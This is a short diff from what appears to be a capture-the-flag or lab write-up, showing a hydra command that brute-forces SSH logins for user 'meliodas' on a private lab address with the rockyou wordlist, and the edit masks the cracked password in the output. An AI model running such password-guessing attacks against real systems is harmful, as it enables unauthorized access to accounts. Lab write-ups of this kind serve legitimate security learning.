@@ -52,7 +52,7 @@ Disallow: /
 ┌──(xnv㉿Kali)-[~]
 └─$ hydra -l meliodas -P rockyou.txt 10.10.200.31 ssh  
 
-[22][ssh] host: 10.10.200.31   login: meliodas   password: iloveyou1
+[22][ssh] host: 10.10.200.31   login: meliodas   password: *******
 ```
 
 ```
